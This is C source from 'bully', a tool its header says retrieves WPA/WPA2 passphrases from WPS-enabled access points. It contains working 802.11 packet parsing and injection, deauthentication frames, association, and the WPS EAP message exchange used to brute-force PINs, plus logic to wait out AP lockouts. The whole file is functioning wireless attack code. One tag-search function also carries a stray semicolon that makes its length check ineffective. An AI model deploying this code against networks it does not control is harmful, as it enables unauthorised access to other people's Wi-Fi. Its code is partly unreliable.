/*
    bully - retrieve WPA/WPA2 passphrase from a WPS-enabled AP

    Copyright (C) 2012  Brian Purcell <purcell.briand@gmail.com>

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/
#include "80211.h"
#include "frame.h"


int parse_packet(frame_t *fp, uint8 *pack, int len, int has_rth, int has_fcs)
{
	rth_t	*rth = (rth_t*)pack;
	int	rthl = (has_rth ? le16toh(rth->it_len) : 0);

	mac_t	*mac = (mac_t*)(pack+rthl);
	int	macl = MAC_SIZE_NORM;
	if (mac->type == MAC_TYPE_CTRL) {
		if (mac->subtype == MAC_ST_RTS)
			macl = MAC_SIZE_RTS;
		else
			if (mac->subtype == MAC_ST_ACK)
				macl = MAC_SIZE_ACK;
	} else
		if (mac->type == MAC_TYPE_DATA)
			if (mac->subtype & MAC_ST_QOSDATA)
				macl += QOS_SIZE;

	int	fcsl = (has_fcs ? 4 : 0);
	fcs_t	*fcs = (fcs_t*)(pack+len-fcsl);

	uint8	*pay = ((uint8*)mac)+macl;
	int	plen = ((uint8*)fcs)-pay;

	fp[F_ALL].data = uc(pack);	fp[F_ALL].size = len;
	fp[F_TAP].data = uc(rth);	fp[F_TAP].size = rthl;
	fp[F_MAC].data = uc(mac);	fp[F_MAC].size = macl;
	fp[F_PAY].data = uc(pay);	fp[F_PAY].size = plen;
	fp[F_FCS].data = uc(fcs);	fp[F_FCS].size = fcsl;

	if (mac->type == MAC_TYPE_DATA
			&& LLC_SIZE <= plen
			&& be16toh(((llc_t*)pay)->type) == LLC_TYPE_AUTH)
	{
		fp[F_PAY].list = &fp[F_LLC];

		llc_t *llc = (llc_t*)pay;
		int llcl = LLC_SIZE;
		pay += llcl; plen -= llcl;

		d1x_t *d1x = (d1x_t*)pay;
		int d1xl = D1X_SIZE;
		pay += d1xl; plen -= d1xl;

		eap_t *eap = (eap_t*)pay;
		int eapl = (d1xl && d1x->type == D1X_TYPE_EAP ? EAP_SIZE : 0);
		pay += eapl; plen -= eapl;

		wfa_t *wfa = (wfa_t*)pay;
		int wfal = (eapl && eap->type == EAP_TYPE_EXPAND ? WFA_SIZE : 0);
		if (wfal)
			if (memcmp(wfa->vid,WFA_VENDOR,sizeof(wfa->vid)) != 0
					|| be32toh(wfa->type) != WFA_SIMPLECONF)
				wfal = 0;
		pay += wfal; plen -= wfal;

		vtag_t *msg = (vtag_t*)pay;
		int msgl = (wfal ? be16toh(eap->len) - (eapl + wfal) : 0);
		pay += msgl; plen -= msgl;

		fp[F_LLC].data = uc(llc);	fp[F_LLC].size = llcl;
		fp[F_D1X].data = uc(d1x);	fp[F_D1X].size = d1xl;
		fp[F_EAP].data = uc(eap);	fp[F_EAP].size = eapl;
		fp[F_WFA].data = uc(wfa);	fp[F_WFA].size = wfal;
		fp[F_MSG].data = uc(msg);	fp[F_MSG].size = msgl;
		fp[F_IDK].data = uc(pay);	fp[F_IDK].size = plen;

		if (eapl && eap->code == EAP_CODE_FAIL)
			return EAPFAIL;
	} else
		fp[F_PAY].list = NULL;

	return SUCCESS;
};


uint8 *build_packet(uint8 *pack, int plen, uint8 *msg, int mlen)
{
	int len = plen + mlen;
	uint8 *buf = malloc(len);
	memcpy(buf,pack,plen);
	memcpy(&buf[len-4],&buf[plen-4],4);
	memcpy(&buf[plen-4],msg,mlen);
	return buf;
};


tag_t *find_tag(void *tagp, int tagl, uint8 id, int len, uint8* vid, int vlen)
{
	tag_t *tag = (tag_t*)tagp;
	while (0<tagl) {
		if (id && tag->id!=id)
			goto next_tag;
		if (len && tag->len!=len)
			goto next_tag;
		if (id!=TAG_VEND || vid==NULL || vlen==0)
			return tag;
		if (memcmp(vid,tag->data,vlen)==0)
			return tag;
	next_tag:
		tagl -= tag->len + TAG_SIZE;
		tag = (tag_t*)((uint8*)tag + tag->len + TAG_SIZE);
	};
	if (tagl)
		vprint("[!] Information element tag(s) extend past end of frame\n");
	return NULL;
};


vtag_t *find_vtag(void *vtagp, int vtagl, uint8* vid, int vlen)
{
	vtag_t *vtag = (vtag_t*)vtagp;
	while (0<vtagl) {
		if (vid && memcmp(vid,&vtag->id,2) != 0)
			goto next_vtag;
		if (!vlen || be16toh(vtag->len) == vlen);
			return vtag;
	next_vtag:
		vtagl -= be16toh(vtag->len) + VTAG_SIZE;
		vtag = (vtag_t*)((uint8*)vtag + be16toh(vtag->len) + VTAG_SIZE);
	};
	if (vtagl)
		vprint("[!] Information element tag(s) extend past end of frame\n");
	return NULL;
};


uint8 *build_ietags(tag_t *tags[], int *tagl)
{
	tag_t **scan = tags;
	uint8 *buf, *out;
	int len = 0;
	while (*scan) {
		len += (*scan++)->len + sizeof(tag_t);
	};
	*tagl = len;
	out = buf = malloc(len);
	while (*tags) {
		memcpy(buf,*tags,(*tags)->len + sizeof(tag_t));
		buf += (*tags++)->len + sizeof(tag_t);
	};
	return out;
};


int next_packet(struct global *G, uint8 type, uint8 subtype, uint8 *dest, uint8 *src,
			struct timeval *timeout, int parse)
{
	uint8	*pack;
	int	len, fc = 0;

	while (!ctrlc || START_EAPOL < G->state) {

		if (check_timer(timeout))
			return TIMEOUT;

		if ((pack = (uint8*)pcap_next(G->pfd, G->phdr)) == 0)
			continue;
		if ((len = G->phdr->len) == 0)
			continue;

		rth_t	*rth = (rth_t*)pack;
		int	rthl = (G->has_rth ? le16toh(rth->it_len) : 0);

		mac_t	*mac = (mac_t*)(pack+rthl);
		if (memcmp(dest,NULL_MAC,6) != 0 && memcmp(mac->adr1.addr,dest,6) != 0)
			continue;
		if (memcmp(src, NULL_MAC,6) != 0 && memcmp(mac->adr2.addr,src ,6) != 0)
			continue;

		if (mac->type != type)
			goto ck_deauth;
		if (mac->subtype != subtype)
			if (type!=MAC_TYPE_DATA || mac->subtype!=(subtype|MAC_ST_QOSDATA))
				goto ck_deauth;

		if (G->has_fcs && !G->nocheck) {
			uint32 crc = ~crc32((u_char*)mac, len-rthl-4);
			uint32 fcs = ((fcs_t*)(pack+len-4))->fcs;
			if (bswap_32(crc) != be32toh(fcs)) {
				fc++;
				if (MAX_FCS_FAIL<=fc) {
					vprint("[!] Excessive (%d) FCS failures while reading next packet\n",
						MAX_FCS_FAIL);
					return FCSFAIL;
				} else
					continue;
			};
		};

		if (parse)
			return parse_packet(G->inp, pack, len, G->has_rth, G->has_fcs);

		break;

	ck_deauth:
		if (mac->type==MAC_TYPE_MGMT)
			if ((mac->subtype==MAC_ST_DISASSOC || mac->subtype==MAC_ST_DEAUTH)
				&& memcmp(dest,NULL_MAC,6) != 0)
			{
				vprint("[!] Received disassociation/deauthentication from the AP\n");
				return DEORDIS;
			};
	};

	return (ctrlc && G->state <= START_EAPOL ? ctrlc : SUCCESS);
};


int send_packet(struct global *G, uint8 *pack, int len, int noack)
{
	struct timeval timer;
	int result = SUCCESS;

	mac_t *mac = (mac_t*)(pack+RTH_SIZE);

	if (32<=len) {
		uint16 s = G->sequence++ << 4;
		mac->sequence = htole16(s);
	};

//	if (G->use_fcs) {
//		uint32 crc = ~crc32((u_char*)mac, len-RTH_SIZE-4);
//		uint32 fcs = bswap_32(crc);
//		*(uint32*)(pack+len-4) = htobe32(fcs);
//	} else
		len -= 4;

	int count = 0;

retry_snd:
	if (pcap_inject(G->pfd, pack, len) != len) {
		vprint("[!] Pcap injection error, failed packet follows\n");
		vprint("[!] >%s<\n",hex(pack,len));
		return INJFAIL;
	};

	if (G->use_ack && !noack) {
		set_timer(&timer, G->acktime);
		result = next_packet(G, MAC_TYPE_CTRL, MAC_ST_ACK, mac->adr2.addr, NULL_MAC, &timer, FALSE);
		if (result == TIMEOUT) {
			if (count++ < G->retries)
				goto retry_snd;
			vprint("[+] Sent packet not acknowledged after %d attempts\n", count);
		};
	};

	return result;
};


void pcap_wait(struct global *G, int msdelay)
{
	int result = ~TIMEOUT;
	struct timeval timer;
	set_timer(&timer, msdelay);
	while (!ctrlc && result != TIMEOUT)
		result = next_packet(G, MAC_TYPE_RSVD, 0, BULL_MAC, BULL_MAC, &timer, FALSE);
};


int	reassoc(struct global *G)
{
	int result, count = 1;
	struct timeval timer;

	if (G->delay) {
		pcap_wait(G, G->delay);
		G->delay = 0;
	};

reassoc:
	G->state = START_ASSOC;
	if (ctrlc)
		return ctrlc;

	set_timer(&timer, G->stdtime);
	if (G->probe) {
		result = send_packet(G, G->dprobe, G->reql, 1);
		result = next_packet(G, MAC_TYPE_MGMT, MAC_ST_PROBE_RESP,
						G->hwmac, G->bssid, &timer, TRUE);
	} else
		result = next_packet(G, MAC_TYPE_MGMT, MAC_ST_BEACON,
						BCAST_MAC, G->bssid, &timer, TRUE);

	if (result == SUCCESS) {
		tag_t *tag = find_tag(G->inp[F_PAY].data+BFP_SIZE, G->inp[F_PAY].size-BFP_SIZE,
					TAG_CHAN, 0, NULL, 0);
		if (tag && tag->data[0] != G->chans[G->chanx]) {
			if (!G->fixed)
				G->chanx = set_chan(G, tag->data[0]);
			else
				vprint("[!] The AP was previously on channel '%s', now on '%d'\n",
							G->schan, tag->data[0]);
		};
		tag = find_tag(G->inp[F_PAY].data+BFP_SIZE, G->inp[F_PAY].size-BFP_SIZE,
				TAG_VEND, 0, MS_WPS_ID, 4);
		if (tag) {
			vtag_t *vtag = find_vtag(&tag->data[4], tag->len-4, TAG_WPS_APLOCK, 1);
			if (vtag && vtag->data[0] == TAG_WPS_LOCKED) {
				if (!G->ignore) {
					vprint("[!] WPS lockout reported, sleeping for %d seconds ...\n", G->lwait);
				lockwait:
					pcap_wait(G, G->lwait * 1000);
					G->dcount = 0;
					goto reassoc;
				};
			};
			if (G->detect && 3 <= G->dcount) {
				vprint("[!] WPS lockout detected, sleeping for %d seconds ...\n", G->lwait);
				goto lockwait;
			};
		};
	} else {
		if (result == TIMEOUT) {
			if (count++ < 3)
				goto reassoc;
			if (!G->fixed) {
				G->chanx = next_chan(G);
				goto reassoc;
			};
		};
		return result;
	};

	G->state++;
	result = send_packet(G, deauth, sizeof(deauth)-1, 0);
	if (result != SUCCESS)
		return result;

	if (G->delay) {
		pcap_wait(G, G->delay);
		G->delay = 0;
		goto reassoc;
	};

	G->state++;
	result = send_packet(G, authrq, sizeof(authrq)-1, 0);
	if (result != SUCCESS)
		return result;

	G->state++;
	set_timer(&timer, G->stdtime);
	result = next_packet(G, MAC_TYPE_MGMT, MAC_ST_AUTH, G->hwmac, G->bssid, &timer, TRUE);
	if (result != SUCCESS)
		return result;
	auth_t *auth = (auth_t*)(G->inp[F_PAY].data);
	if (le16toh(auth->status) != AUTH_SUCCESS) {
		vprint("[!] Authentication failure '0x%04x', restarting transaction\n",
				le16toh(auth->status));
		return DEORDIS;
	};

	G->state++;
	result = send_packet(G, G->asshat, G->assl, 0);
	if (result != SUCCESS)
		return result;

	G->state++;
	set_timer(&timer, G->stdtime);
	result = next_packet(G, MAC_TYPE_MGMT, MAC_ST_ASSOC_RESP, G->hwmac, G->bssid, &timer, TRUE);
	if (result != SUCCESS)
		return result;
	resp_t *resp = (resp_t*)(G->inp[F_PAY].data);
	if (le16toh(resp->status) != RESP_SUCCESS) {
		vprint("[!] Association failure '0x%04x', restarting transaction\n",
				le16toh(resp->status));
		return DEORDIS;
	};

	return SUCCESS;
};


int wpstran(struct global *G)
{
	enum wsc_op_code opcode;
	enum wps_state state;
	struct timeval timer;

	int	result, quit = 0;
	llc_t	*llc;
	eap_t	*eap;
	wfa_t	*wfa;
	wpab_t	*msg;
	uint8	*pack;
	vtag_t	*tag;

restart:
	G->state = START_EAPOL;
	result = send_packet(G, eapols, sizeof(eapols)-1, 0);
	if (result != SUCCESS)
		return result;

read_id:
	G->state++;
	set_timer(&timer, G->stdtime);
	result = next_packet(G, MAC_TYPE_DATA, MAC_ST_DATA, G->hwmac, G->bssid, &timer, TRUE);
	if (result != SUCCESS) {
		if (result == TIMEOUT)
			goto restart;
		return result;
	};

	if (!G->inp[F_PAY].list || G->inp[F_EAP].size<EAP_SIZE) {
	eap_err:
		vprint("[!] Unexpected packet received when waiting for EAP Req Id\n");
		vprint("[!] >%s<\n", hex(G->inp[F_ALL].data, G->inp[F_ALL].size));
		return EAPFAIL;
	};

	eap = (eap_t*)G->inp[F_EAP].data;
	if (eap->code != EAP_CODE_REQ || eap->type != EAP_TYPE_ID)
		goto eap_err;
	eap_id[G->eapidx] = eapolf[G->eapidx] = eap->id;

send_id:
	G->state++;
	result = send_packet(G, eap_id, sizeof(eap_id)-1, 0);
	if (result != SUCCESS)
		return result;
	G->wdata->state = RECV_M1;

read_mx:
	G->state++;
	state = G->wdata->state;

	set_timer(&timer, (state==RECV_M1||state==RECV_M3||G->m57nack!=0 ? G->m13time : G->stdtime));
	result = next_packet(G, MAC_TYPE_DATA, MAC_ST_DATA, G->hwmac, G->bssid, &timer, TRUE);

	if (result != SUCCESS) switch (result) {
		case FCSFAIL:	return result;
		case DEORDIS:	return result;
		case EAPFAIL:	quit = result; G->state++; goto eapfail;
		case TIMEOUT:	quit = result;
				if (G->m57nack)
					quit = (state==RECV_M5 ? KEY1NAK : state==RECV_M7 ? KEY2NAK : result);
				G->wdata->state = SEND_WSC_NACK;
				goto send_mx;
	};

	if (!G->inp[F_PAY].list || !G->inp[F_MSG].size) {
		if (G->inp[F_PAY].list) {
			eap = (eap_t*)G->inp[F_EAP].data;
			if (eap->code == EAP_CODE_REQ && eap->type == EAP_TYPE_ID) {
				G->state--;
				goto read_mx;
			};
		};
	wps_err:
		vprint("[!] Unexpected packet received when waiting for WPS Message\n");
		vprint("[!] >%s<\n", hex(G->inp[F_ALL].data, G->inp[F_ALL].size));
		quit = WPSFAIL; G->state++; goto eapfail;

	} else {
		tag = find_vtag(G->inp[F_MSG].data,G->inp[F_MSG].size,WPS_MSG_TYPE,1);
		if (tag) {
			if (G->detect && state == RECV_M3)
				if (tag->data[0] == MSG_NACK || tag->data[0] == MSG_M2D)
					G->dcount+= 1;
				else
					G->dcount = 0;

			if (tag->data[0] == MSG_NACK)
				quit = (state==RECV_M5 ? KEY1NAK : state==RECV_M7 ? KEY2NAK : WPSFAIL);
			else
				if (tag->data[0] != map[G->state]) {
					vprint("[!] Received M2D or out of sequence WPS Message\n");
					G->wdata->state = SEND_WSC_NACK;
					quit = WPSFAIL;
				};
		} else
			goto wps_err;
	};

	eap = (eap_t*)G->inp[F_EAP].data;
	wfamsg[G->eapidx] = eapolf[G->eapidx] = eap->id;

	wfa = (wfa_t*)G->inp[F_WFA].data;
	opcode = wfa->op;

	msg = wpabuf_alloc_copy(G->inp[F_MSG].data, G->inp[F_MSG].size);
	wps_registrar_process_msg(G->wdata, opcode, msg);
	wpabuf_free(msg);

	if (tag->data[0] == MSG_M7)
		return SUCCESS;

send_mx:
	G->state++;
	msg = wps_registrar_get_msg(G->wdata, &opcode);
	if (msg) {
		uint8 *buf = msg->ext_data;
		if (!buf)
			buf = ((uint8*)msg)+sizeof(struct wpabuf);

		int eapl = msg->used + EAP_SIZE + WFA_SIZE;
		*(uint16*)(&wfamsg[G->eaplnx]) = htobe16(eapl);
		*(uint16*)(&wfamsg[G->d1xlnx]) = htobe16(eapl);
		wfamsg[G->wfaopx] = opcode;

		pack = build_packet(wfamsg, sizeof(wfamsg)-1, buf, msg->used);
		result = send_packet(G, pack, sizeof(wfamsg)-1 + msg->used, 0);
		free(pack);

		if (result != SUCCESS)
			return result;
	} else
		quit = WPSFAIL;

eapfail:
	if (quit) {
		if (G->eapfail) {
			send_packet(G, eapolf, sizeof(eapolf)-1, 0);
			set_timer(&timer, G->stdtime + G->stdtime);
			do {	result = next_packet(G, MAC_TYPE_DATA, MAC_ST_DATA,
							G->hwmac, G->bssid, &timer, TRUE);
			} while (result != EAPFAIL && result != TIMEOUT);
		};
		G->state--;
		return quit;
	};

	goto read_mx;
};

